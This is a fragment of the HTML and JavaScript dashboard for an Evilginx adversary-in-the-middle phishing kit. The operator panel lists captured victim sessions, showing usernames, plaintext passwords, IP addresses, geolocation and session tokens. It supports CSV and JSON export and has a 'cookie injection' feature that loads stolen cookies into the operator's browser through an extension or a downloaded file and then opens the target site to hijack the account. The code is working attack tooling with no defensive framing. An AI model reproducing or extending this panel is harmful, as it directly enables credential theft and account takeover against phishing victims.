        <div class="modal-acts">
          <button class="btn btn-sm btn-g" id="openTargetBtn" onclick="openTargetSite()">Open Target Site</button>
          <button class="btn btn-sm" onclick="copyCookieHeader()">Copy Cookie Header</button>
          <button class="btn btn-sm" onclick="reDownloadCookies()">Re-download JSON</button>
        </div>
      </div>
    </div>
  </div>

  <!-- Table -->
  <div class="tbl-wrap">
    <table>
      <thead>
        <tr>
          <th style="width:28px"><input type="checkbox" class="chk" id="selectAll" onchange="toggleSelectAll(this)"></th>
          <th onclick="sortBy('id')">ID<span class="si" id="si-id"></span></th>
          <th onclick="sortBy('phishlet')">Phishlet<span class="si" id="si-phishlet"></span></th>
          <th onclick="sortBy('username')">Username<span class="si" id="si-username"></span></th>
          <th onclick="sortBy('password')">Password<span class="si" id="si-password"></span></th>
          <th onclick="sortBy('remote_addr')">IP<span class="si" id="si-remote_addr"></span></th>
          <th onclick="sortBy('tokens')">Tokens<span class="si" id="si-tokens"></span></th>
          <th onclick="sortBy('create_time')">Captured<span class="si" id="si-create_time"></span></th>
          <th style="width:44px"></th>
        </tr>
      </thead>
      <tbody id="tbody">
        <tr><td colspan="9"><div class="empty"><div class="empty-ico">&#9685;</div><p>Loading&#8230;</p></div></td></tr>
      </tbody>
    </table>
  </div>

  <!-- Pagination / bulk -->
  <div class="pager">
    <div class="bulk-bar">
      <span id="selCount">0 selected</span>
      <button class="btn btn-sm btn-r" id="bulkDelBtn" onclick="bulkDelete()" style="display:none">Delete Selected</button>
    </div>
    <span class="page-info" id="pageInfo">Page 1 of 1</span>
    <div class="page-btns">
      <button class="btn btn-sm" onclick="prevPage()">&#8592; Prev</button>
      <button class="btn btn-sm" onclick="nextPage()">Next &#8594;</button>
    </div>
  </div>

</main>

<div id="toast" class="toast"></div>

<script>
/* ── State ── */
var allSessions = [];
var filtered = [];
var currentPage = 0;
var pageSize = 50;
var sortField = 'create_time';
var sortAsc = false;
var autoRefresh = true;
var arTimer = null;
var arCountdown = 10;
var selectedIds = new Set();
var currentDetailId = null;
var isDark = true;
var activeQF = 'all';

/* ── Theme ── */
function toggleTheme() {
  isDark = !isDark;
  document.documentElement.setAttribute('data-theme', isDark ? '' : 'light');
  document.getElementById('themeLabel').textContent = isDark ? 'Light' : 'Dark';
  document.getElementById('themeDot').style.background = isDark ? 'var(--amber)' : 'var(--blue)';
}

/* ── Auto-refresh ── */
function startAR() {
  arCountdown = 10;
  clearInterval(arTimer);
  arTimer = setInterval(function() {
    arCountdown--;
    var b = document.getElementById('refreshBadge');
    if (arCountdown <= 0) {
      b.textContent = 'LIVE'; b.className = 'live';
      refreshSessions();
      arCountdown = 10;
    } else {
      b.textContent = arCountdown + 's'; b.className = '';
    }
  }, 1000);
}

function toggleAutoRefresh() {
  autoRefresh = !autoRefresh;
  var btn = document.getElementById('arBtn');
  var b = document.getElementById('refreshBadge');
  if (autoRefresh) {
    btn.textContent = 'Pause'; b.textContent = 'LIVE'; b.className = 'live';
    startAR();
  } else {
    btn.textContent = 'Resume'; b.textContent = 'PAUSED'; b.className = '';
    clearInterval(arTimer);
  }
}

function manualRefresh() { refreshSessions(); if (autoRefresh) arCountdown = 10; }

document.addEventListener('visibilitychange', function() {
  if (document.hidden) clearInterval(arTimer);
  else if (autoRefresh) { startAR(); refreshSessions(); }
});

/* ── Data helpers ── */
function hasTokens(s) {
  return (s.tokens && Object.keys(s.tokens).length > 0) ||
         (s.body_tokens && Object.keys(s.body_tokens).length > 0) ||
         (s.http_tokens && Object.keys(s.http_tokens).length > 0);
}

async function refreshSessions() {
  try {
    var r = await fetch('/api/sessions?limit=10000');
    var d = await r.json();
    allSessions = d.sessions || [];
    updatePhishletChips(d.phishlets || []);
    updateStats();
    applyFilters();
  } catch(e) {}
}

/* ── Stats + sidebar ── */
function updateStats() {
  var total = allSessions.length;
  var withTok = allSessions.filter(hasTokens).length;
  var noTok = total - withTok;
  var ips = new Set(allSessions.map(function(s){ return s.remote_addr; })).size;
  var pls = new Set(allSessions.map(function(s){ return s.phishlet; })).size;

  document.getElementById('sStat').textContent = total;
  document.getElementById('tStat').textContent = withTok;
  document.getElementById('tPct').textContent = total > 0 ? Math.round(withTok/total*100) + '% rate' : '';
  document.getElementById('ntStat').textContent = noTok;
  document.getElementById('ipStat').textContent = ips;
  document.getElementById('plStat').textContent = pls;

  if (allSessions.length > 0) {
    var last = allSessions.reduce(function(a,b){ return a.create_time > b.create_time ? a : b; });
    var d = new Date(last.create_time * 1000);
    document.getElementById('lcStat').textContent = d.toLocaleTimeString();
    document.getElementById('lcSub').textContent = d.toLocaleDateString();
  } else {
    document.getElementById('lcStat').textContent = '--';
    document.getElementById('lcSub').textContent = '';
  }

  updateSidebar(withTok, noTok, total);
}

/* ── Sidebar ── */
function updateSidebar(withTok, noTok, total) {
  document.getElementById('qf-all').textContent = total;
  document.getElementById('qf-tokens').textContent = withTok;
  document.getElementById('qf-notokens').textContent = noTok;

  var plList = [];
  var seen = {};
  allSessions.forEach(function(s){
    if (s.phishlet && !seen[s.phishlet]) { seen[s.phishlet] = true; plList.push(s.phishlet); }
  });
  plList.sort();

  var counts = {};
  allSessions.forEach(function(s){ counts[s.phishlet] = (counts[s.phishlet]||0) + 1; });

  var section = document.getElementById('sbPlSection');
  var sbPl = document.getElementById('sbPhishlets');
  if (plList.length > 0) {
    section.style.display = '';
    sbPl.innerHTML = plList.map(function(p) {
      var active = activeQF === p ? ' active' : '';
      return '<div class="sb-item' + active + '" data-pl="' + escQ(p) + '" onclick="quickFilter(\'' + escQ(p) + '\')">' +
             '<span class="sb-item-label">' + esc(p) + '</span>' +
             '<span class="sb-count">' + (counts[p]||0) + '</span></div>';
    }).join('');
  } else {
    section.style.display = 'none';
  }
  updateSBActive();
}

function quickFilter(type) {
  activeQF = type;
  var isBuiltin = (type === 'all' || type === 'tokens' || type === 'notokens');
  document.getElementById('tokenFilter').value = type === 'tokens' ? 'yes' : type === 'notokens' ? 'no' : '';
  document.getElementById('phishletFilter').value = isBuiltin ? '' : type;
  updateSBActive();
  applyFilters();
}

function updateSBActive() {
  ['all','tokens','notokens'].forEach(function(k) {
    var el = document.getElementById('sbi-' + k);
    if (el) el.classList.toggle('active', activeQF === k);
  });
  var items = document.querySelectorAll('#sbPhishlets .sb-item');
  items.forEach(function(el) {
    el.classList.toggle('active', el.dataset.pl === activeQF);
  });
}

/* ── Phishlet chips (select only) ── */
function updatePhishletChips(phishlets) {
  var sel = document.getElementById('phishletFilter');
  var cur = sel.value;
  sel.innerHTML = '<option value="">All phishlets</option>' +
    phishlets.map(function(p){ return '<option value="' + p + '">' + p + '</option>'; }).join('');
  sel.value = cur;
}

function setPlFilter(val) {
  var sel = document.getElementById('phishletFilter');
  sel.value = sel.value === val ? '' : val;
  applyFilters();
}

/* ── Filters ── */
function applyFilters() {
  var search = document.getElementById('searchInput').value.toLowerCase();
  var pl = document.getElementById('phishletFilter').value;
  var tok = document.getElementById('tokenFilter').value;

  filtered = allSessions.filter(function(s) {
    if (pl && s.phishlet !== pl) return false;
    if (tok === 'yes' && !hasTokens(s)) return false;
    if (tok === 'no' && hasTokens(s)) return false;
    if (search) {
      return (s.username||'').toLowerCase().indexOf(search) !== -1 ||
             (s.password||'').toLowerCase().indexOf(search) !== -1 ||
             (s.phishlet||'').toLowerCase().indexOf(search) !== -1 ||
             (s.remote_addr||'').toLowerCase().indexOf(search) !== -1 ||
             (s.useragent||s.user_agent||'').toLowerCase().indexOf(search) !== -1;
    }
    return true;
  });

  filtered.sort(function(a,b) {
    var va = a[sortField], vb = b[sortField];
    if (typeof va === 'string') va = va.toLowerCase();
    if (typeof vb === 'string') vb = vb.toLowerCase();
    if (va === undefined || va === null) va = '';
    if (vb === undefined || vb === null) vb = '';
    if (va < vb) return sortAsc ? -1 : 1;
    if (va > vb) return sortAsc ? 1 : -1;
    return 0;
  });

  currentPage = 0;
  var fc = document.getElementById('filterCount');
  fc.textContent = filtered.length !== allSessions.length
    ? filtered.length + ' of ' + allSessions.length + ' sessions'
    : allSessions.length + ' sessions';
  renderTable();
}

function clearFilters() {
  document.getElementById('searchInput').value = '';
  document.getElementById('phishletFilter').value = '';
  document.getElementById('tokenFilter').value = '';
  activeQF = 'all';
  updateSBActive();
  applyFilters();
}

/* ── Table ── */
function renderTable() {
  var start = currentPage * pageSize;
  var page = filtered.slice(start, start + pageSize);
  var totalPages = Math.ceil(filtered.length / pageSize) || 1;
  document.getElementById('pageInfo').textContent = 'Page ' + (currentPage+1) + ' of ' + totalPages;

  if (page.length === 0) {
    document.getElementById('tbody').innerHTML =
      '<tr><td colspan="9"><div class="empty"><div class="empty-ico">&#9685;</div><p>No sessions match your filters.</p></div></td></tr>';
    return;
  }

  document.getElementById('tbody').innerHTML = page.map(function(s) {
    var time = s.create_time ? new Date(s.create_time * 1000).toLocaleString() : '--';
    var tok = hasTokens(s);
    var sel = selectedIds.has(s.id) ? ' selected' : '';
    var sj = JSON.stringify(s).replace(/"/g, '&quot;');
    return '<tr class="srow' + sel + '" data-id="' + s.id + '">' +
      '<td><input type="checkbox" class="chk row-chk" onchange="toggleSelect(' + s.id + ',this)" ' + (selectedIds.has(s.id) ? 'checked' : '') + '></td>' +
      '<td class="cid" onclick="openDetail(' + sj + ')">' + (s.id||'-') + '</td>' +
      '<td onclick="openDetail(' + sj + ')"><span class="tag tag-pl">' + esc(s.phishlet||'-') + '</span></td>' +
      '<td class="cm cp" title="Click to copy" onclick="copyText(\'' + escQ(s.username||'') + '\',event)">' + esc(s.username||'--') + '</td>' +
      '<td class="cm cp" title="Click to copy" onclick="copyText(\'' + escQ(s.password||'') + '\',event)">' + (s.password ? esc(s.password) : '<span style="color:var(--dim)">--</span>') + '</td>' +
      '<td class="cm">' + esc(s.remote_addr||'--') + '</td>' +
      '<td>' + (tok ? '<span class="tag tag-ok">captured</span>' : '<span class="tag tag-no">none</span>') + '</td>' +
      '<td style="color:var(--dim);font-size:10px;font-family:var(--mono)">' + time + '</td>' +
      '<td><button class="btn btn-xs btn-r" onclick="event.stopPropagation();deleteSession(' + s.id + ')">Del</button></td>' +
      '</tr>';
  }).join('');

  updateSelCount();
}

/* ── Sorting ── */
function sortBy(field) {
  if (sortField === field) sortAsc = !sortAsc;
  else { sortField = field; sortAsc = false; }
  var fields = ['id','phishlet','username','password','remote_addr','tokens','create_time'];
  fields.forEach(function(f) {
    var el = document.getElementById('si-' + f);
    if (!el) return;
    el.innerHTML = sortField === f ? (sortAsc ? '&#9650;' : '&#9660;') : '';
    el.parentElement.classList.toggle('sorted', sortField === f);
  });
  renderTable();
}

/* ── Selection ── */
function toggleSelect(id, chk) {
  if (chk.checked) selectedIds.add(id); else selectedIds.delete(id);
  updateSelCount();
  var row = document.querySelector('tr[data-id="' + id + '"]');
  if (row) row.classList.toggle('selected', chk.checked);
}
function toggleSelectAll(chk) {
  var page = filtered.slice(currentPage*pageSize, currentPage*pageSize+pageSize);
  page.forEach(function(s){ if (chk.checked) selectedIds.add(s.id); else selectedIds.delete(s.id); });
  renderTable();
}
function updateSelCount() {
  var n = selectedIds.size;
  document.getElementById('selCount').textContent = n + ' selected';
  document.getElementById('bulkDelBtn').style.display = n > 0 ? '' : 'none';
}

/* ── CRUD actions ── */
async function deleteSession(id) {
  if (!confirm('Delete session #' + id + '?')) return;
  try {
    var r = await fetch('/api/sessions/' + id, { method: 'DELETE' });
    if (r.ok) { selectedIds.delete(id); await refreshSessions(); toast('Session #' + id + ' deleted', 'ok'); }
    else toast('Delete failed', 'err');
  } catch(e) { toast('Delete failed', 'err'); }
}
async function bulkDelete() {
  var ids = Array.from(selectedIds);
  if (!ids.length) return;
  if (!confirm('Delete ' + ids.length + ' sessions?')) return;
  var ok = 0;
  for (var i = 0; i < ids.length; i++) {
    try { var r = await fetch('/api/sessions/' + ids[i], { method: 'DELETE' }); if (r.ok) ok++; } catch(e){}
  }
  selectedIds.clear(); await refreshSessions(); toast(ok + ' sessions deleted', 'ok');
}
async function deleteCurrentDetail() {
  if (!currentDetailId) return;
  await deleteSession(currentDetailId);
  closeDetail();
}
function prevPage() { if (currentPage > 0) { currentPage--; renderTable(); } }
function nextPage() { if ((currentPage+1)*pageSize < filtered.length) { currentPage++; renderTable(); } }
function exportCSV() { window.open('/api/sessions/export?format=csv'); }
function exportJSON() { window.open('/api/sessions/export?format=json'); }

/* ── Detail panel ── */
function openDetail(s) {
  currentDetailId = s.id;
  document.getElementById('detailTitle').textContent = 'Session #' + s.id + ' — ' + (s.phishlet||'');
  var ua = s.useragent || s.user_agent || '--';
  var allTok = Object.assign({}, s.tokens||{});
  var tokStr = Object.keys(allTok).length > 0 ? JSON.stringify(allTok, null, 2) : '(none)';
  var hasTok = hasTokens(s);

  document.getElementById('injectBtn').style.display = hasTok ? '' : 'none';

  var custom = s.custom || {};
  var geoLine = '--';
  if (custom.geo_country_name) {
    geoLine = (custom.geo_city_name ? custom.geo_city_name + ', ' : '') + custom.geo_country_name;
    if (custom.geo_isp) geoLine += ' — ' + custom.geo_isp;
    if (custom.geo_vpn === 'true') geoLine += ' [VPN]';
    if (custom.geo_datacenter === 'true') geoLine += ' [DC]';
  }

  var fields = [
    ['Username', s.username||'--'],
    ['Password', s.password||'--'],
    ['IP Address', s.remote_addr||'--'],
    ['Location', geoLine],
    ['Landing URL', s.landing_url||'--'],
  ];

  document.getElementById('detailBody').innerHTML =
    fields.map(function(f) {
      return '<div class="df"><label>' + esc(f[0]) + '</label>' +
        '<div class="fval cm" onclick="copyText(\'' + escQ(f[1]) + '\',event)" title="Click to copy">' + esc(f[1]) + '</div></div>';
    }).join('') +
    '<div class="df df-wide"><label>User Agent</label><div class="fval" style="font-size:10px">' + esc(ua) + '</div></div>' +
    '<div class="df df-wide"><label>Tokens ' + (hasTok ? '<span style="color:var(--green)">(captured)</span>' : '<span style="color:var(--dim)">(none)</span>') + '</label><pre>' + esc(tokStr) + '</pre></div>';

  document.getElementById('detailPanel').style.display = '';
  document.getElementById('detailPanel').scrollIntoView({ behavior: 'smooth', block: 'nearest' });

  /* Notify extension popup of selected session */
  window.postMessage({ type: 'EVILGINX_SESSION_SELECT', payload: { sessionId: s.id, phishlet: s.phishlet, hasTokens: hasTok } }, '*');
}

function closeDetail() {
  document.getElementById('detailPanel').style.display = 'none';
  currentDetailId = null;
}

function copyAll() {
  if (!currentDetailId) return;
  var s = allSessions.find(function(x){ return x.id === currentDetailId; });
  if (!s) return;
  var t = 'Session #' + s.id + '\nPhishlet: ' + s.phishlet +
          '\nUsername: ' + s.username + '\nPassword: ' + s.password +
          '\nIP: ' + s.remote_addr + '\nTime: ' + new Date(s.create_time*1000).toLocaleString();
  copyText(t, null);
}

/* ── Utilities ── */
function copyText(text, e) {
  if (e) e.stopPropagation();
  if (!text || text === '--') return;
  navigator.clipboard.writeText(text).then(function(){ toast('Copied', 'info'); }).catch(function(){});
}
function copyToClipboard(text) {
  navigator.clipboard.writeText(text).catch(function(){});
}
function esc(str) {
  var d = document.createElement('div'); d.textContent = String(str); return d.innerHTML;
}
function escQ(str) { return String(str).replace(/\\/g,'\\\\').replace(/'/g,"\\'"); }
function toast(msg, type) {
  var el = document.getElementById('toast');
  el.textContent = msg; el.className = 'toast t-' + type + ' on';
  setTimeout(function(){ el.classList.remove('on'); }, 2500);
}

/* ── Extension detection ── */
var extAvailable = false;

document.addEventListener('evilginx-extension-ready', function() {
  extAvailable = true;
  document.getElementById('extBadge').style.display = '';
});

window.addEventListener('evilginx-inject-result', function(e) {
  var r = e.detail || {};
  var errEl = document.getElementById('injectExtErrors');
  if (r.failed && r.failed > 0 && r.errors && r.errors.length) {
    errEl.textContent = r.errors.join('\n'); errEl.style.display = '';
  } else {
    errEl.style.display = 'none';
  }
  document.getElementById('injectExtCount').textContent =
    (r.success||0) + ' cookies injected' + (r.failed ? ', ' + r.failed + ' failed' : '') + '.';
});

/* ── Cookie injection ── */
var injectData = null;

async function injectSession() {
  if (!currentDetailId) return;
  try {
    var r = await fetch('/api/cookies/' + currentDetailId);
    if (!r.ok) { toast('Failed to fetch cookies', 'err'); return; }
    injectData = await r.json();

    document.getElementById('injectExtPanel').style.display = 'none';
    document.getElementById('injectManualPanel').style.display = 'none';

    if (extAvailable) {
      document.getElementById('injectExtPanel').style.display = '';
      document.getElementById('injectExtCount').textContent = 'Injecting ' + injectData.count + ' cookies…';
      document.getElementById('injectExtErrors').style.display = 'none';
      document.getElementById('injectModal').style.display = 'flex';
      window.postMessage({ type: 'EVILGINX_INJECT', payload: injectData }, '*');
    } else {
      downloadCookieFile(injectData);
      document.getElementById('injectCookieCount').textContent =
        injectData.count + ' cookies for ' + (injectData.phishlet||'session') + ' ready to import.';
      if (injectData.target_url) {
        document.getElementById('openTargetBtn').textContent = 'Open ' + injectData.target_url;
      }
      document.getElementById('injectManualPanel').style.display = '';
      document.getElementById('injectModal').style.display = 'flex';
    }
  } catch(e) { toast('Inject error: ' + e, 'err'); }
}

function downloadCookieFile(data) {
  var json = JSON.stringify(data.cookies||[], null, 2);
  var blob = new Blob([json], { type: 'application/json' });
  var url = URL.createObjectURL(blob);
  var a = document.createElement('a');
  a.href = url; a.download = 'session_' + data.session_id + '_cookies.json';
  document.body.appendChild(a); a.click(); document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

function reDownloadCookies() { if (injectData) downloadCookieFile(injectData); }

function copyCookieHeader() {
  if (!injectData || !injectData.cookie_header) { toast('No cookie header available', 'err'); return; }
  copyToClipboard(injectData.cookie_header);
  toast('Cookie header copied', 'info');
}

function openTargetSite() {
  if (injectData && injectData.target_url) window.open(injectData.target_url, '_blank');
}

function closeInjectModal() {
  document.getElementById('injectModal').style.display = 'none';
}

/* ── Init sort indicator ── */
document.getElementById('si-create_time').innerHTML = '&#9660;';
document.querySelector('th[onclick="sortBy(\'create_time\')"]').classList.add('sorted');

/* ── Boot ── */
refreshSessions();
startAR();
</script>
</body>
</html>`
